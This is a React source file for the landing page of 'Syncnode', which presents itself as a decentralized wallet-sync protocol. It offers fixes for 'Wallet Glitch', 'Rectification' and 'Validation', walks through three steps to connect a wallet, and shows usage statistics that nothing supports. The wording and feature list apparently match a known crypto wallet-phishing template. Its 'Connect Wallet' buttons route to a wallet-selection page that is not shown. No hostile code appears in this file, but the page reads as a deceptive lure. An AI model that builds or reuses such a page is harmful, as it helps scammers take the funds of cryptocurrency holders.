import { Navbar } from "@/components/Navbar";
import { Footer } from "@/components/Footer";
import { FeatureCard } from "@/components/FeatureCard";
import { Button } from "@/components/ui/button";
import { Link } from "wouter";
import { motion } from "framer-motion";
import { 
  Layers, 
  ArrowLeftRight, 
  Wallet, 
  Gift, 
  ShieldCheck, 
  ShoppingCart, 
  RefreshCcw, 
  Zap, 
  Download, 
  Coins, 
  Server, 
  FileCheck 
} from "lucide-react";

export default function Home() {
  const container = {
    hidden: { opacity: 0 },
    show: {
      opacity: 1,
      transition: {
        staggerChildren: 0.1
      }
    }
  };

  const item = {
    hidden: { opacity: 0, y: 20 },
    show: { opacity: 1, y: 0 }
  };

  return (
    <div className="min-h-screen bg-background text-foreground overflow-x-hidden">
      <Navbar />

      {/* Hero Section */}
      <section className="relative pt-32 pb-20 lg:pt-48 lg:pb-32 px-4 overflow-hidden">
        {/* Background Effects */}
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[1000px] h-[600px] bg-cyan-500/10 rounded-full blur-[120px] -z-10" />
        <div className="absolute bottom-0 right-0 w-[800px] h-[600px] bg-purple-500/10 rounded-full blur-[120px] -z-10" />
        
        <div className="max-w-7xl mx-auto text-center relative z-10">
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8 }}
          >
            <span className="inline-block px-4 py-1.5 rounded-full border border-cyan-500/30 bg-cyan-500/10 text-cyan-300 text-sm font-medium mb-6 backdrop-blur-sm">
              Next Generation Protocol
            </span>
            <h1 className="text-5xl md:text-7xl font-bold font-display tracking-tight mb-6 leading-tight">
              Join Top-Tier <br />
              <span className="text-gradient">AI, Web3 & Metaverse</span> <br />
              Synchronization
            </h1>
            <p className="text-lg md:text-xl text-slate-400 max-w-2xl mx-auto mb-10 leading-relaxed">
              Open and Decentralized Protocol for Syncing Various Wallets to Dapps. 
              The most secure way to manage your crypto assets across multiple chains.
            </p>
            
            <div className="flex flex-col sm:flex-row gap-4 justify-center items-center">
              <Link href="/select-wallet">
                <Button className="h-14 px-8 text-lg rounded-full bg-cyan-500 hover:bg-cyan-600 text-white font-semibold shadow-lg shadow-cyan-500/25 hover:shadow-cyan-500/40 hover:-translate-y-1 transition-all duration-300">
                  Connect Wallet
                </Button>
              </Link>
              <a href="#how-it-works">
                <Button variant="outline" className="h-14 px-8 text-lg rounded-full border-white/10 hover:bg-white/5 hover:text-white transition-all text-slate-300">
                  How it works
                </Button>
              </a>
            </div>
          </motion.div>
        </div>
      </section>

      {/* Features Grid */}
      <section id="features" className="py-20 px-4 bg-slate-950/30">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-3xl md:text-4xl font-bold font-display text-white mb-4">Ecosystem Features</h2>
            <p className="text-slate-400 max-w-2xl mx-auto">Everything you need to manage your digital assets in one place.</p>
          </div>

          <motion.div 
            variants={container}
            initial="hidden"
            whileInView="show"
            viewport={{ once: true }}
            className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6"
          >
            <motion.div variants={item}><FeatureCard icon={<Layers />} title="Staking" description="Stake your assets to earn rewards with high APY secure pools." /></motion.div>
            <motion.div variants={item}><FeatureCard icon={<ArrowLeftRight />} title="Bridge" description="Transfer assets between different blockchains seamlessly." /></motion.div>
            <motion.div variants={item}><FeatureCard icon={<Wallet />} title="Connect Wallet" description="Link your Web3 wallet to access dapps securely." /></motion.div>
            <motion.div variants={item}><FeatureCard icon={<Gift />} title="Claim" description="Check eligibility and claim your airdrop rewards." /></motion.div>
            
            <motion.div variants={item}><FeatureCard icon={<ShieldCheck />} title="KYC" description="Complete identity verification for regulatory compliance." /></motion.div>
            <motion.div variants={item}><FeatureCard icon={<ShoppingCart />} title="BUY" description="Purchase crypto assets directly using fiat currency." /></motion.div>
            <motion.div variants={item}><FeatureCard icon={<RefreshCcw />} title="Swap/Exchange" description="Instant token swaps with the best market rates." /></motion.div>
            <motion.div variants={item}><FeatureCard icon={<Zap />} title="Wallet Glitch" description="Fix synchronization errors and connection issues." /></motion.div>
            
            <motion.div variants={item}><FeatureCard icon={<Download />} title="Airdrop" description="Participate in new token distribution events." /></motion.div>
            <motion.div variants={item}><FeatureCard icon={<Coins />} title="NFT" description="View, manage and trade your NFT collections." /></motion.div>
            <motion.div variants={item}><FeatureCard icon={<Server />} title="Rectification" description="Resolve transaction failures and stuck nonces." /></motion.div>
            <motion.div variants={item}><FeatureCard icon={<FileCheck />} title="Validation" description="Validate your wallet ownership and transaction history." /></motion.div>
          </motion.div>
        </div>
      </section>

      {/* How It Works */}
      <section id="how-it-works" className="py-24 px-4 relative overflow-hidden">
        <div className="max-w-7xl mx-auto">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
            <div>
              <h2 className="text-4xl font-bold font-display text-white mb-6">
                How to join Top Tier Web <br />
                <span className="text-cyan-400">Synchronization Dapp</span>
              </h2>
              <p className="text-slate-400 text-lg mb-10 leading-relaxed">
                Only 3 little steps are needed for you to start enjoying all the advantages of Syncnode. 
                Our protocol ensures your data remains encrypted and private throughout the process.
              </p>
              
              <div className="space-y-8">
                {[
                  { title: "Select Wallet", desc: "In other to create a linking between syncnode and your wallet protocol, on the landing page, click on create connection and the select the wallet of concern to you.", num: "01" },
                  { title: "Establish Connection", desc: "After selecting wallet, the system will automatically verify the status of your wallet via our AML verification process and afterwards create a secure end to end connection.", num: "02" },
                  { title: "Error Rectification", desc: "Our syncnode will automatically rectify any lingering defect noticed in the connected wallet and produce a feedback of clearification on the result page.", num: "03" }
                ].map((step, i) => (
                  <div key={i} className="flex gap-6 relative group">
                    <div className="w-12 h-12 rounded-xl bg-slate-800 border border-white/5 flex items-center justify-center shrink-0 font-bold font-display text-xl text-cyan-400 group-hover:bg-cyan-500 group-hover:text-white transition-all duration-300 z-10">
                      {step.num}
                    </div>
                    {i !== 2 && <div className="absolute left-6 top-12 bottom-[-32px] w-px bg-white/10 group-hover:bg-cyan-500/30 transition-colors delay-100" />}
                    <div>
                      <h3 className="text-xl font-bold text-white mb-2">{step.title}</h3>
                      <p className="text-slate-400 leading-relaxed">{step.desc}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
            
            <div className="relative">
              {/* Abstract decorative graphic */}
              <div className="absolute inset-0 bg-gradient-to-tr from-cyan-500/20 to-purple-500/20 rounded-3xl blur-3xl -z-10" />
              <div className="glass-card rounded-3xl p-8 border border-white/10">
                <img 
                  src="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?q=80&w=2832&auto=format&fit=crop" 
                  alt="Blockchain Technology" 
                  className="rounded-2xl w-full h-auto mb-6 shadow-2xl"
                />
                {/* Descriptive comment for image replacement if needed: High-tech blockchain visualization abstract 3d art */}
                
                <h3 className="text-2xl font-bold text-white mb-2">Web3 SDKS</h3>
                <p className="text-slate-400 mb-6">
                  The Web3Modal SDK allows you to easily connect your Web3 app with wallets. It provides a simple and intuitive interface for requesting actions such as signing transactions and interacting with smart contracts on the blockchain.
                </p>
                <Link href="/select-wallet">
                  <Button className="w-full bg-slate-800 hover:bg-slate-700 text-white py-6">
                    Connect Now
                  </Button>
                </Link>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Stats Section */}
      <section className="py-20 border-y border-white/5 bg-slate-900/50">
        <div className="max-w-7xl mx-auto px-4">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 text-center">
            {[
              { label: "Active Wallets", value: "2M+" },
              { label: "Total Volume", value: "$850M" },
              { label: "Supported Chains", value: "75+" },
              { label: "Uptime", value: "99.9%" }
            ].map((stat, i) => (
              <div key={i}>
                <div className="text-4xl md:text-5xl font-bold font-display text-white mb-2">{stat.value}</div>
                <div className="text-cyan-400 font-medium">{stat.label}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      <Footer />
    </div>
  );
}
